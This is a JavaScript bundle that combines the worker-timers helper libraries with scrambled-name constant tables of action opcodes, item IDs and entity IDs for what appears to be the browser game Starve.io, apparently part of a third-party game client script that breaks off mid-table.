(function (e, t) {
  if (typeof exports == "object" && typeof module != "undefined") {
    t(exports);
  } else if (typeof define == "function" && define.amd) {
    define(["exports"], t);
  } else {
    t((e = typeof globalThis != "undefined" ? globalThis : e || self).fastUniqueNumbers = {});
  }
})(this, function (e) {
  "use strict";

  var t;
  var i;
  var $;
  var o;
  var l = Number.MAX_SAFE_INTEGER === undefined ? 9007199254740991 : Number.MAX_SAFE_INTEGER;
  var n = new WeakMap();
  t = n;
  i = function (e, i) {
    t.set(e, i);
    return i;
  };
  $ = n;
  function s(e) {
    var t = $.get(e);
    var o = t === undefined ? e.size : t < 1073741824 ? t + 1 : 0;
    if (!e.has(o)) {
      return i(e, o);
    }
    if (e.size < 536870912) {
      while (e.has(o)) {
        o = Math.floor(Math.random() * 1073741824);
      }
      return i(e, o);
    }
    if (e.size > l) {
      throw Error("Congratulations, you created a collection of unique numbers which uses all available integers!");
    }
    while (e.has(o)) {
      o = Math.floor(Math.random() * l);
    }
    return i(e, o);
  }
  o = s;
  function r(e) {
    var t = o(e);
    e.add(t);
    return t;
  }
  e.addUniqueNumber = r;
  e.generateUniqueNumber = s;
  Object.defineProperty(e, "__esModule", {
    value: true
  });
});
(function (e, t) {
  if (typeof exports == "object" && typeof module != "undefined") {
    t(exports, require("fast-unique-numbers"));
  } else if (typeof define == "function" && define.amd) {
    define(["exports", "fast-unique-numbers"], t);
  } else {
    t((e = typeof globalThis != "undefined" ? globalThis : e || self).workerTimersBroker = {}, e.fastUniqueNumbers);
  }
})(this, function (e, t) {
  "use strict";

  e.load = function (e) {
    var i = new Map([[0, function () { }]]);
    var $ = new Map([[0, function () { }]]);
    var o = new Map();
    var l = new Worker(e);
    l.addEventListener("message", function (e) {
      var t;
      var l = e.data;
      if ((t = l).method !== undefined && t.method === "call") {
        var n = l.params;
        var s = n.timerId;
        var r = n.timerType;
        if (r === "interval") {
          var c = i.get(s);
          if (typeof c == "number") {
            var O = o.get(c);
            if (O === undefined || O.timerId !== s || O.timerType !== r) {
              throw Error("The timer is in an undefined state.");
            }
          } else {
            if (c === undefined) {
              throw Error("The timer is in an undefined state.");
            }
            c();
          }
        } else if (r === "timeout") {
          var p = $.get(s);
          if (typeof p == "number") {
            var u = o.get(p);
            if (u === undefined || u.timerId !== s || u.timerType !== r) {
              throw Error("The timer is in an undefined state.");
            }
          } else {
            if (p === undefined) {
              throw Error("The timer is in an undefined state.");
            }
            p();
            $.delete(s);
          }
        }
      } else {
        if ((N = l).error !== null || typeof N.id != "number") {
          throw Error(l.error.message);
        }
        var N;
        var E = l.id;
        var d = o.get(E);
        if (d === undefined) {
          throw Error("The timer is in an undefined state.");
        }
        var f = d.timerId;
        var g = d.timerType;
        o.delete(E);
        if (g === "interval") {
          i.delete(f);
        } else {
          $.delete(f);
        }
      }
    });
    return {
      clearInterval: function (e) {
        var $ = t.generateUniqueNumber(o);
        o.set($, {
          timerId: e,
          timerType: "interval"
        });
        i.set(e, $);
        l.postMessage({
          id: $,
          method: "clear",
          params: {
            timerId: e,
            timerType: "interval"
          }
        });
      },
      clearTimeout: function (e) {
        var i = t.generateUniqueNumber(o);
        o.set(i, {
          timerId: e,
          timerType: "timeout"
        });
        $.set(e, i);
        l.postMessage({
          id: i,
          method: "clear",
          params: {
            timerId: e,
            timerType: "timeout"
          }
        });
      },
      setInterval: function (e, $) {
        var o = t.generateUniqueNumber(i);
        i.set(o, function () {
          e();
          if (typeof i.get(o) == "function") {
            l.postMessage({
              id: null,
              method: "set",
              params: {
                delay: $,
                now: performance.now(),
                timerId: o,
                timerType: "interval"
              }
            });
          }
        });
        l.postMessage({
          id: null,
          method: "set",
          params: {
            delay: $,
            now: performance.now(),
            timerId: o,
            timerType: "interval"
          }
        });
        return o;
      },
      setTimeout: function (e, i) {
        var o = t.generateUniqueNumber($);
        $.set(o, e);
        l.postMessage({
          id: null,
          method: "set",
          params: {
            delay: i,
            now: performance.now(),
            timerId: o,
            timerType: "timeout"
          }
        });
        return o;
      }
    };
  };
  Object.defineProperty(e, "__esModule", {
    value: true
  });
});
(function (e, t) {
  if (typeof exports == "object" && typeof module != "undefined") {
    t(exports, require("worker-timers-broker"));
  } else if (typeof define == "function" && define.amd) {
    define(["exports", "worker-timers-broker"], t);
  } else {
    t((e = typeof globalThis != "undefined" ? globalThis : e || self).workerTimers = {}, e.workerTimersBroker);
  }
})(this, function (e, t) {
  "use strict";

  var i;
  var $ = null;
  i = t.load;
  function o() {
    if ($ !== null) {
      return $;
    }
    var e = new Blob(["(()=>{var e={67:(e,t,r)=>{var o,i;void 0===(i=\"function\"==typeof(o=function(){\"use strict\";var e=new Map,t=new Map,r=function(t){var r=e.get(t);if(void 0===r)throw new Error('There is no interval scheduled with the given id \"'.concat(t,'\".'));clearTimeout(r),e.delete(t)},o=function(e){var r=t.get(e);if(void 0===r)throw new Error('There is no timeout scheduled with the given id \"'.concat(e,'\".'));clearTimeout(r),t.delete(e)},i=function(e,t){var r,o=performance.now();return{expected:o+(r=e-Math.max(0,o-t)),remainingDelay:r}},n=function e(t,r,o,i){var n=performance.now();n>o?postMessage({id:null,method:\"call\",params:{timerId:r,timerType:i}}):t.set(r,setTimeout(e,o-n,t,r,o,i))},a=function(t,r,o){var a=i(t,o),s=a.expected,d=a.remainingDelay;e.set(r,setTimeout(n,d,e,r,s,\"interval\"))},s=function(e,r,o){var a=i(e,o),s=a.expected,d=a.remainingDelay;t.set(r,setTimeout(n,d,t,r,s,\"timeout\"))};addEventListener(\"message\",(function(e){var t=e.data;try{if(\"clear\"===t.method){var i=t.id,n=t.params,d=n.timerId,c=n.timerType;if(\"interval\"===c)r(d),postMessage({error:null,id:i});else{if(\"timeout\"!==c)throw new Error('The given type \"'.concat(c,'\" is not supported'));o(d),postMessage({error:null,id:i})}}else{if(\"set\"!==t.method)throw new Error('The given method \"'.concat(t.method,'\" is not supported'));var u=t.params,l=u.delay,p=u.now,m=u.timerId,v=u.timerType;if(\"interval\"===v)a(l,m,p);else{if(\"timeout\"!==v)throw new Error('The given type \"'.concat(v,'\" is not supported'));s(l,m,p)}}}catch(e){postMessage({error:{message:e.message},id:t.id,result:null})}}))})?o.call(t,r,t,e):o)||(e.exports=i)}},t={};function r(o){var i=t[o];if(void 0!==i)return i.exports;var n=t[o]={exports:{}};return e[o](n,n.exports,r),n.exports}r.n=e=>{var t=e&&e.__esModule?()=>e.default:()=>e;return r.d(t,{a:t}),t},r.d=(e,t)=>{for(var o in t)r.o(t,o)&&!r.o(e,o)&&Object.defineProperty(e,o,{enumerable:!0,get:t[o]})},r.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),(()=>{\"use strict\";r(67)})()})();"], {
      type: "application/javascript; charset=utf-8"
    });
    var t = URL.createObjectURL(e);
    ($ = i(t)).setTimeout(function () {
      return URL.revokeObjectURL(t);
    }, 0);
    return $;
  }
  e.clearInterval = function (e) {
    return o().clearInterval(e);
  };
  e.clearTimeout = function (e) {
    return o().clearTimeout(e);
  };
  e.setInterval = function (e, t) {
    return o().setInterval(e, t);
  };
  e.setTimeout = function (e, t) {
    return o().setTimeout(e, t);
  };
  Object.defineProperty(e, "__esModule", {
    value: true
  });
});
const a0POSTfile = {
  angle: 10,
  attack: 19,
  stopAttack: 38,
  selectInv: 33,
  craft: 13,
  chat: 5,
  build: 17,
  update_cam: 0,
  drop_one: 35,
  drop_all: 27,
  resurrection: 30,
  extractorput: 11,
  extractortake: 21,
  chestTake: 9,
  put_windmill: 37,
  take_windmill: 20,
  put_wood_oven: 36,
  put_flour_oven: 1,
  take_bread: 25,
  put_chest: 24,
  join_totem: 12,
  cancel_crafting: 32
};
let a0ENCRyptjson = 0;
const a0CONNectloop = {
  STONE_SWORD: a0ENCRyptjson++,
  STONE_PICK: a0ENCRyptjson++,
  RABBIT_FUR: a0ENCRyptjson++,
  GOLD_PICK: a0ENCRyptjson++,
  DIAMOND_PICK: a0ENCRyptjson++,
  GOLD_SWORD: a0ENCRyptjson++,
  DIAMOND_SWORD: a0ENCRyptjson++,
  HAND: a0ENCRyptjson++,
  WOOD_PICK: a0ENCRyptjson++,
  PIRATE_SWORD: a0ENCRyptjson++,
  EARMUFFS: a0ENCRyptjson++,
  BIG_CHAPKA: a0ENCRyptjson++,
  WOOD_SPEAR: a0ENCRyptjson++,
  STONE_SPEAR: a0ENCRyptjson++,
  GOLD_SPEAR: a0ENCRyptjson++,
  DIAMOND_SPEAR: a0ENCRyptjson++,
  DRAGON_SPEAR: a0ENCRyptjson++,
  LAVA_SPEAR: a0ENCRyptjson++,
  CRAB_SPEAR: a0ENCRyptjson++,
  EMERALD_SPEAR: a0ENCRyptjson++,
  COPPER_SPEAR: a0ENCRyptjson++,
  IRON_SPEAR: a0ENCRyptjson++,
  TOPAZ_SPEAR: a0ENCRyptjson++,
  SAPPHIRE_SPEAR: a0ENCRyptjson++,
  JADE_SPEAR: a0ENCRyptjson++,
  RUBY_SPEAR: a0ENCRyptjson++,
  COAL_SPEAR: a0ENCRyptjson++,
  AQUAMARINE_SPEAR: a0ENCRyptjson++,
  REIDITE_SWORD: a0ENCRyptjson++,
  DIAMOND_FIRE_PROTECTION_: a0ENCRyptjson++,
  AMETHYST_FIRE_PROTECTION_: a0ENCRyptjson++,
  REIDITE_FIRE_PROTECTION_: a0ENCRyptjson++,
  EXPLORER_HAT: a0ENCRyptjson++,
  PIRATE_HAT: a0ENCRyptjson++,
  STONE_HELMET: a0ENCRyptjson++,
  GOLD_HELMET: a0ENCRyptjson++,
  DIAMOND_HELMET: a0ENCRyptjson++,
  EMERALD_HELMET: a0ENCRyptjson++,
  COPPER_HELMET: a0ENCRyptjson++,
  IRON_HELMET: a0ENCRyptjson++,
  TOPAZ_HELMET: a0ENCRyptjson++,
  SAPPHIRE_HELMET: a0ENCRyptjson++,
  JADE_HELMET: a0ENCRyptjson++,
  RUBY_HELMET: a0ENCRyptjson++,
  COAL_HELMET: a0ENCRyptjson++,
  AQUAMARINE_HELMET: a0ENCRyptjson++,
  BOOK: a0ENCRyptjson++,
  BAG: a0ENCRyptjson++,
  AMETHYST_SWORD: a0ENCRyptjson++,
  AMETHYST_PICK: a0ENCRyptjson++,
  REIDITE_PICK: a0ENCRyptjson++,
  EMERALD_PICK: a0ENCRyptjson++,
  COPPER_PICK: a0ENCRyptjson++,
  IRON_PICK: a0ENCRyptjson++,
  TOPAZ_PICK: a0ENCRyptjson++,
  SAPPHIRE_PICK: a0ENCRyptjson++,
  JADE_PICK: a0ENCRyptjson++,
  RUBY_PICK: a0ENCRyptjson++,
  COAL_PICK: a0ENCRyptjson++,
  AQUAMARINE_PICK: a0ENCRyptjson++,
  AMETHYST_SPEAR: a0ENCRyptjson++,
  REIDITE_SPEAR: a0ENCRyptjson++,
  STONE_HAMMER: a0ENCRyptjson++,
  GOLD_HAMMER: a0ENCRyptjson++,
  DIAMOND_HAMMER: a0ENCRyptjson++,
  AMETHYST_HAMMER: a0ENCRyptjson++,
  REIDITE_HAMMER: a0ENCRyptjson++,
  CAP_SCARF: a0ENCRyptjson++,
  CHRISTMAS_HAT: a0ENCRyptjson++,
  ELF_HAT: a0ENCRyptjson++,
  AMETHYST_HELMET: a0ENCRyptjson++,
  REIDITE_HELMET: a0ENCRyptjson++,
  SUPER_HAMMER: a0ENCRyptjson++,
  EMERALD_HAMMER: a0ENCRyptjson++,
  COPPER_HAMMER: a0ENCRyptjson++,
  IRON_HAMMER: a0ENCRyptjson++,
  TOPAZ_HAMMER: a0ENCRyptjson++,
  SAPPHIRE_HAMMER: a0ENCRyptjson++,
  JADE_HAMMER: a0ENCRyptjson++,
  RUBY_HAMMER: a0ENCRyptjson++,
  COAL_HAMMER: a0ENCRyptjson++,
  AQUAMARINE_HAMMER: a0ENCRyptjson++,
  STONE_SHOVEL: a0ENCRyptjson++,
  SUPER_DIVING_SUIT: a0ENCRyptjson++,
  DIVING_MASK: a0ENCRyptjson++,
  WATERING_CAN_FULL: a0ENCRyptjson++,
  GOLD_SHOVEL: a0ENCRyptjson++,
  DIAMOND_SHOVEL: a0ENCRyptjson++,
  AMETHYST_SHOVEL: a0ENCRyptjson++,
  REIDITE_SHOVEL: a0ENCRyptjson++,
  EMERALD_SHOVEL: a0ENCRyptjson++,
  COPPER_SHOVEL: a0ENCRyptjson++,
  IRON_SHOVEL: a0ENCRyptjson++,
  TOPAZ_SHOVEL: a0ENCRyptjson++,
  SAPPHIRE_SHOVEL: a0ENCRyptjson++,
  JADE_SHOVEL: a0ENCRyptjson++,
  RUBY_SHOVEL: a0ENCRyptjson++,
  COAL_SHOVEL: a0ENCRyptjson++,
  AQUAMARINE_SHOVEL: a0ENCRyptjson++,
  PITCHFORK: a0ENCRyptjson++,
  PITCHFORK_2: a0ENCRyptjson++,
  SPANNER: a0ENCRyptjson++,
  MACHETE: a0ENCRyptjson++,
  WOOD_SWORD: a0ENCRyptjson++,
  WOOD_HELMET: a0ENCRyptjson++,
  DRAGON_HELMET: a0ENCRyptjson++,
  LAVA_HELMET: a0ENCRyptjson++,
  CRAB_CROWN: a0ENCRyptjson++,
  DRAGON_SWORD: a0ENCRyptjson++,
  LAVA_SWORD: a0ENCRyptjson++,
  EMERALD_SWORD: a0ENCRyptjson++,
  COPPER_SWORD: a0ENCRyptjson++,
  IRON_SWORD: a0ENCRyptjson++,
  TOPAZ_SWORD: a0ENCRyptjson++,
  SAPPHIRE_SWORD: a0ENCRyptjson++,
  JADE_SWORD: a0ENCRyptjson++,
  RUBY_SWORD: a0ENCRyptjson++,
  COAL_SWORD: a0ENCRyptjson++,
  AQUAMARINE_SWORD: a0ENCRyptjson++,
  WOOD_BOW: a0ENCRyptjson++,
  STONE_BOW: a0ENCRyptjson++,
  GOLD_BOW: a0ENCRyptjson++,
  DIAMOND_BOW: a0ENCRyptjson++,
  AMETHYST_BOW: a0ENCRyptjson++,
  REIDITE_BOW: a0ENCRyptjson++,
  DRAGON_BOW: a0ENCRyptjson++,
  EMERALD_BOW: a0ENCRyptjson++,
  COPPER_BOW: a0ENCRyptjson++,
  IRON_BOW: a0ENCRyptjson++,
  TOPAZ_BOW: a0ENCRyptjson++,
  SAPPHIRE_BOW: a0ENCRyptjson++,
  JADE_BOW: a0ENCRyptjson++,
  RUBY_BOW: a0ENCRyptjson++,
  COAL_BOW: a0ENCRyptjson++,
  AQUAMARINE_BOW: a0ENCRyptjson++,
  WOOD_SHIELD: a0ENCRyptjson++,
  STONE_SHIELD: a0ENCRyptjson++,
  GOLD_SHIELD: a0ENCRyptjson++,
  DIAMOND_SHIELD: a0ENCRyptjson++,
  AMETHYST_SHIELD: a0ENCRyptjson++,
  REIDITE_SHIELD: a0ENCRyptjson++,
  ᐃⲆᐃⲆⲆ: a0ENCRyptjson++,
  ΔⵠΔⵠᐃ: a0ENCRyptjson++,
  ⵠᐃΔⲆⲆ: a0ENCRyptjson++,
  ⲆⵠᐃΔⵠ: a0ENCRyptjson++,
  ⵠᐃⲆᐃⵠ: a0ENCRyptjson++,
  ᐃᐃⲆⵠΔ: a0ENCRyptjson++,
  ⵠᐃΔΔⲆ: a0ENCRyptjson++,
  ᐃᐃⲆⵠⵠ: a0ENCRyptjson++,
  ⵠⲆΔᐃΔ: a0ENCRyptjson++,
  CROWN_OF_LIFE: a0ENCRyptjson++,
  CROWN_OF_LUCK: a0ENCRyptjson++,
  CROWN_OF_THE_ANGEL: a0ENCRyptjson++,
  TURBAN: a0ENCRyptjson++,
  NINJA_OUTFIT: a0ENCRyptjson++,
  PILOT_HELMET: a0ENCRyptjson++,
  HOOD: a0ENCRyptjson++,
  PEASANT: a0ENCRyptjson++,
  WINTER_HOOD: a0ENCRyptjson++,
  WINTER_PEASANT: a0ENCRyptjson++,
  FLOWER_HAT: a0ENCRyptjson++,
  FUR_HAT: a0ENCRyptjson++,
  SADDLE: a0ENCRyptjson++,
  WITCH: a0ENCRyptjson++,
  NIMBUS: a0ENCRyptjson++,
  WAND1: a0ENCRyptjson++,
  WAND2: a0ENCRyptjson++,
  WOOD_AXE: a0ENCRyptjson++,
  STONE_AXE: a0ENCRyptjson++,
  GOLD_AXE: a0ENCRyptjson++,
  DIAMOND_AXE: a0ENCRyptjson++,
  AMETHYST_AXE: a0ENCRyptjson++,
  REIDITE_AXE: a0ENCRyptjson++,
  EMERALD_AXE: a0ENCRyptjson++,
  COPPER_AXE: a0ENCRyptjson++,
  IRON_AXE: a0ENCRyptjson++,
  TOPAZ_AXE: a0ENCRyptjson++,
  SAPPHIRE_AXE: a0ENCRyptjson++,
  JADE_AXE: a0ENCRyptjson++,
  RUBY_AXE: a0ENCRyptjson++,
  COAL_AXE: a0ENCRyptjson++,
  AQUAMARINE_AXE: a0ENCRyptjson++,
  FIREFLY: a0ENCRyptjson++,
  WOOD_ARROW: a0ENCRyptjson++,
  STONE_ARROW: a0ENCRyptjson++,
  GOLD_ARROW: a0ENCRyptjson++,
  DIAMOND_ARROW: a0ENCRyptjson++,
  AMETHYST_ARROW: a0ENCRyptjson++,
  REIDITE_ARROW: a0ENCRyptjson++,
  DRAGON_ARROW: a0ENCRyptjson++,
  EMERALD_ARROW: a0ENCRyptjson++,
  COPPER_ARROW: a0ENCRyptjson++,
  IRON_ARROW: a0ENCRyptjson++,
  TOPAZ_ARROW: a0ENCRyptjson++,
  SAPPHIRE_ARROW: a0ENCRyptjson++,
  JADE_ARROW: a0ENCRyptjson++,
  RUBY_ARROW: a0ENCRyptjson++,
  COAL_ARROW: a0ENCRyptjson++,
  AQUAMARINE_ARROW: a0ENCRyptjson++,
  STONE: a0ENCRyptjson++,
  WOOD: a0ENCRyptjson++,
  BERRY: a0ENCRyptjson++,
  GOLD: a0ENCRyptjson++,
  DIAMOND: a0ENCRyptjson++,
  CAMPFIRE: a0ENCRyptjson++,
  WORKBENCH: a0ENCRyptjson++,
  BERRY_SEED: a0ENCRyptjson++,
  MEAT: a0ENCRyptjson++,
  COOKED_MEAT: a0ENCRyptjson++,
  BIG_CAMPFIRE: a0ENCRyptjson++,
  FURNACE: a0ENCRyptjson++,
  PAPER: a0ENCRyptjson++,
  AMETHYST: a0ENCRyptjson++,
  AMETHYST_WALL: a0ENCRyptjson++,
  AMETHYST_SPIKE: a0ENCRyptjson++,
  AMETHYST_DOOR: a0ENCRyptjson++,
  BRIDGE: a0ENCRyptjson++,
  SAND: a0ENCRyptjson++,
  BOTTLE_FULL: a0ENCRyptjson++,
  BOTTLE_FULL__WITH_ICE_: a0ENCRyptjson++,
  BOTTLE_FULL__WITH_WELL_: a0ENCRyptjson++,
  BOTTLE_EMPTY: a0ENCRyptjson++,
  KRAKEN_SKIN: a0ENCRyptjson++,
  WATERING_CAN: a0ENCRyptjson++,
  FLOUR: a0ENCRyptjson++,
  WHEAT_SEED: a0ENCRyptjson++,
  COOKIE: a0ENCRyptjson++,
  WHEAT: a0ENCRyptjson++,
  WINDMILL: a0ENCRyptjson++,
  CAKE: a0ENCRyptjson++,
  FISH: a0ENCRyptjson++,
  FOODFISH_COOKED: a0ENCRyptjson++,
  PIRANHA_SCALES: a0ENCRyptjson++,
  DIRT: a0ENCRyptjson++,
  PLOT: a0ENCRyptjson++,
  ICE: a0ENCRyptjson++,
  BREAD: a0ENCRyptjson++,
  BREAD_OVEN: a0ENCRyptjson++,
  SANDWICH: a0ENCRyptjson++,
  WINTER_FUR: a0ENCRyptjson++,
  BLUE_CORD: a0ENCRyptjson++,
  LOCK: a0ENCRyptjson++,
  DRAGON_HEART: a0ENCRyptjson++,
  LAVA_HEART: a0ENCRyptjson++,
  RESURRECTION: a0ENCRyptjson++,
  EMERALD_MACHINE: a0ENCRyptjson++,
  STONE_EXTRACTOR: a0ENCRyptjson++,
  GOLD_EXTRACTOR: a0ENCRyptjson++,
  DIAMOND_EXTRACTOR: a0ENCRyptjson++,
  AMETHYST_EXTRACTOR: a0ENCRyptjson++,
  REIDITE_EXTRACTOR: a0ENCRyptjson++,
  EMERALD_EXTRACTOR: a0ENCRyptjson++,
  COPPER_EXTRACTOR: a0ENCRyptjson++,
  IRON_EXTRACTOR: a0ENCRyptjson++,
  TOPAZ_EXTRACTOR: a0ENCRyptjson++,
  SAPPHIRE_EXTRACTOR: a0ENCRyptjson++,
  JADE_EXTRACTOR: a0ENCRyptjson++,
  RUBY_EXTRACTOR: a0ENCRyptjson++,
  COAL_EXTRACTOR: a0ENCRyptjson++,
  AQUAMARINE_EXTRACTOR: a0ENCRyptjson++,
  LOCKPICK: a0ENCRyptjson++,
  TOTEM: a0ENCRyptjson++,
  WOOD_SPIKE: a0ENCRyptjson++,
  WEB: a0ENCRyptjson++,
  WOOD_WALL: a0ENCRyptjson++,
  STONE_WALL: a0ENCRyptjson++,
  GOLD_WALL: a0ENCRyptjson++,
  DIAMOND_WALL: a0ENCRyptjson++,
  WOOD_DOOR: a0ENCRyptjson++,
  CHEST: a0ENCRyptjson++,
  STONE_SPIKE: a0ENCRyptjson++,
  GOLD_SPIKE: a0ENCRyptjson++,
  DIAMOND_SPIKE: a0ENCRyptjson++,
  STONE_DOOR: a0ENCRyptjson++,
  GOLD_DOOR: a0ENCRyptjson++,
  DIAMOND_DOOR: a0ENCRyptjson++,
  WOLF_FUR: a0ENCRyptjson++,
  GEM_OF_LIFE: a0ENCRyptjson++,
  GEM_OF_LUCK: a0ENCRyptjson++,
  GEM_OF_THE_ANGEL: a0ENCRyptjson++,
  SPECIAL_FUR_PEASANT: a0ENCRyptjson++,
  SPECIAL_FUR_HOOD: a0ENCRyptjson++,
  BUCKET_FULL: a0ENCRyptjson++,
  BUCKET_EMPTY: a0ENCRyptjson++,
  WELL: a0ENCRyptjson++,
  SIGN: a0ENCRyptjson++,
  CUBE_OF_THE_DRAGON: a0ENCRyptjson++,
  ORB_OF_THE_DRAGON: a0ENCRyptjson++,
  CUBE_OF_THE_DRAGON: a0ENCRyptjson++,
  ORB_OF_THE_DRAGON: a0ENCRyptjson++,
  PUMPKIN_SEED: a0ENCRyptjson++,
  PUMPKIN: a0ENCRyptjson++,
  ROOF: a0ENCRyptjson++,
  GARLIC_SEED: a0ENCRyptjson++,
  GARLIC: a0ENCRyptjson++,
  THORBUSHES_SEED: a0ENCRyptjson++,
  THORNBUSH: a0ENCRyptjson++,
  BANDAGE: a0ENCRyptjson++,
  CRAB_STICK: a0ENCRyptjson++,
  CRAB_LOOT: a0ENCRyptjson++,
  BED: a0ENCRyptjson++,
  SUGAR_CANE: a0ENCRyptjson++,
  CANDY: a0ENCRyptjson++,
  GARLAND: a0ENCRyptjson++,
  REIDITE: a0ENCRyptjson++,
  FLAME: a0ENCRyptjson++,
  COPPER: a0ENCRyptjson++,
  IRON: a0ENCRyptjson++,
  TOPAZ: a0ENCRyptjson++,
  SAPPHIRE: a0ENCRyptjson++,
  JADE: a0ENCRyptjson++,
  RUBY: a0ENCRyptjson++,
  COAL: a0ENCRyptjson++,
  AQUAMARINE: a0ENCRyptjson++,
  CARROT_SEED: a0ENCRyptjson++,
  CARROT: a0ENCRyptjson++,
  TOMATO_SEED: a0ENCRyptjson++,
  TOMATO: a0ENCRyptjson++,
  WATERMELON_SEED: a0ENCRyptjson++,
  WATERMELON: a0ENCRyptjson++,
  ALOE_VERA_SEED: a0ENCRyptjson++,
  ALOE_VERA: a0ENCRyptjson++,
  WOOD_DOOR_SPIKE: a0ENCRyptjson++,
  STONE_DOOR_SPIKE: a0ENCRyptjson++,
  GOLD_DOOR_SPIKE: a0ENCRyptjson++,
  DIAMOND_DOOR_SPIKE: a0ENCRyptjson++,
  AMETHYST_DOOR_SPIKE: a0ENCRyptjson++,
  REIDITE_WALL: a0ENCRyptjson++,
  REIDITE_DOOR: a0ENCRyptjson++,
  REIDITE_SPIKE: a0ENCRyptjson++,
  REIDITE_DOOR_SPIKE: a0ENCRyptjson++,
  WOOD_TOWER: a0ENCRyptjson++,
  PENGUIN_FEATHER: a0ENCRyptjson++,
  BOAT: a0ENCRyptjson++,
  SLED: a0ENCRyptjson++,
  MOUNT_BOAR: a0ENCRyptjson++,
  MOUNT_KING_CRAB: a0ENCRyptjson++,
  MOUNT_BABY_DRAGON: a0ENCRyptjson++,
  MOUNT_BABY_LAVA: a0ENCRyptjson++,
  MOUNT_HAWK: a0ENCRyptjson++,
  PLANE: a0ENCRyptjson++,
  HAWK_FEATHER: a0ENCRyptjson++,
  VULTURE_FEATHER: a0ENCRyptjson++,
  CACTUS: a0ENCRyptjson++,
  EMERALD: a0ENCRyptjson++,
  PITCHFORK_PART: a0ENCRyptjson++,
  PILOT_PART: a0ENCRyptjson++,
  BOAR_FUR: a0ENCRyptjson++,
  EMERALD_MACHINE: a0ENCRyptjson++,
  BABY_MAMMOTH: a0ENCRyptjson++,
  FUR_MAMMOTH: a0ENCRyptjson++,
  CROCODILE_SCALES: a0ENCRyptjson++,
  PARROT_FEATHER: a0ENCRyptjson++,
  OCELOT_FUR: a0ENCRyptjson++,
  MOUNT_PARROT: a0ENCRyptjson++,
  MOUNT_VULTURE: a0ENCRyptjson++,
  BANANA: a0ENCRyptjson++,
  BANANA_SEED: a0ENCRyptjson++,
  MOUNT_HEN: a0ENCRyptjson++
};
a0ENCRyptjson = 0;
const a0HOOKjob = {
  PLAYERS: a0ENCRyptjson++,
  FIRE: a0ENCRyptjson++,
  WORKBENCH: a0ENCRyptjson++,
  SEED: a0ENCRyptjson++,
  WALL: a0ENCRyptjson++,
  SPIKE: a0ENCRyptjson++,
  BIG_FIRE: a0ENCRyptjson++,
  STONE_WALL: a0ENCRyptjson++,
  GOLD_WALL: a0ENCRyptjson++,
  DIAMOND_WALL: a0ENCRyptjson++,
  WOOD_DOOR: a0ENCRyptjson++,
  CHEST: a0ENCRyptjson++,
  STONE_SPIKE: a0ENCRyptjson++,
  GOLD_SPIKE: a0ENCRyptjson++,
  DIAMOND_SPIKE: a0ENCRyptjson++,
  STONE_DOOR: a0ENCRyptjson++,
  GOLD_DOOR: a0ENCRyptjson++,
  DIAMOND_DOOR: a0ENCRyptjson++,
  FURNACE: a0ENCRyptjson++,
  AMETHYST_WALL: a0ENCRyptjson++,
  AMETHYST_SPIKE: a0ENCRyptjson++,
  AMETHYST_DOOR: a0ENCRyptjson++,
  RESURRECTION: a0ENCRyptjson++,
  EMERALD_MACHINE: a0ENCRyptjson++,
  EXTRACTOR_MACHINE_STONE: a0ENCRyptjson++,
  EXTRACTOR_MACHINE_GOLD: a0ENCRyptjson++,
  EXTRACTOR_MACHINE_DIAMOND: a0ENCRyptjson++,
  EXTRACTOR_MACHINE_AMETHYST: a0ENCRyptjson++,
  EXTRACTOR_MACHINE_REIDITE: a0ENCRyptjson++,
  TEMP: a0ENCRyptjson++,
  TEMP: a0ENCRyptjson++,
  TEMP: a0ENCRyptjson++,
  TEMP: a0ENCRyptjson++,
  TEMP: a0ENCRyptjson++,
  TEMP: a0ENCRyptjson++,
  TEMP: a0ENCRyptjson++,
  TEMP: a0ENCRyptjson++,
  TEMP: a0ENCRyptjson++,
  TOTEM: a0ENCRyptjson++,
  BRIDGE: a0ENCRyptjson++,
  WHEAT_SEED: a0ENCRyptjson++,
  WINDMILL: a0ENCRyptjson++,
  PLOT: a0ENCRyptjson++,
  BREAD_OVEN: a0ENCRyptjson++,
  WELL: a0ENCRyptjson++,
  SIGN: a0ENCRyptjson++,
  PUMPKIN_SEED: a0ENCRyptjson++,
  ROOF: a0ENCRyptjson++,
  GARLIC_SEED: a0ENCRyptjson++,
  THORNBUSH_SEED: a0ENCRyptjson++,
  BED: a0ENCRyptjson++,
  GARLAND: a0ENCRyptjson++,
  TOMATO_SEED: a0ENCRyptjson++,
  CARROT_SEED: a0ENCRyptjson++,
  WOOD_DOOR_SPIKE: a0ENCRyptjson++,
  STONE_DOOR_SPIKE: a0ENCRyptjson++,
  GOLD_DOOR_SPIKE: a0ENCRyptjson++,
  DIAMOND_DOOR_SPIKE: a0ENCRyptjson++,
  AMETHYST_DOOR_SPIKE: a0ENCRyptjson++,
  REIDITE_WALL: a0ENCRyptjson++,
  REIDITE_DOOR: a0ENCRyptjson++,
  REIDITE_SPIKE: a0ENCRyptjson++,
  REIDITE_DOOR_SPIKE: a0ENCRyptjson++,
  WATERMELON_SEED: a0ENCRyptjson++,
  ALOE_VERA_SEED: a0ENCRyptjson++,
  WOOD_TOWER: a0ENCRyptjson++,
  TEMP1: a0ENCRyptjson++,
  WOLF: a0ENCRyptjson++,
  SPIDER: a0ENCRyptjson++,
  FOX: a0ENCRyptjson++,
  BEAR: a0ENCRyptjson++,
  DRAGON: a0ENCRyptjson++,
  PIRANHA: a0ENCRyptjson++,
  KRAKEN: a0ENCRyptjson++,
  CRAB: a0ENCRyptjson++,
  FLAME: a0ENCRyptjson++,
  LAVA_DRAGON: a0ENCRyptjson++,
  BOAR: a0ENCRyptjson++,
  CRAB_BOSS: a0ENCRyptjson++,
  BABY_DRAGON: a0ENCRyptjson++,
  BABY_LAVA: a0ENCRyptjson++,
  HAWK: a0ENCRyptjson++,
  VULTURE: a0ENCRyptjson++,
  SAND_WORM: a0ENCRyptjson++,
  BABY_MAMMOTH: a0ENCRyptjson++,
  MAMMOTH: a0ENCRyptjson++,
  WHEAT_MOB: a0ENCRyptjson++,
  TEMP2: a0ENCRyptjson++,
  TEMP3: a0ENCRyptjson++,
  GOLDEN_HEN: a0ENCRyptjson++,
  GOLDEN_CHICKEN: a0ENCRyptjson++,
  TEMP: a0ENCRyptjson++,
  RABBIT: a0ENCRyptjson++,
  TREASURE_CHEST: a0ENCRyptjson++,
  DEAD_BOX: a0ENCRyptjson++,
  PUMPKIN_MOB: a0ENCRyptjson++,
  GARLIC_MOB: a0ENCRyptjson++,
  THORNBUSH_MOB: a0ENCRyptjson++,
  CRATE: a0ENCRyptjson++,
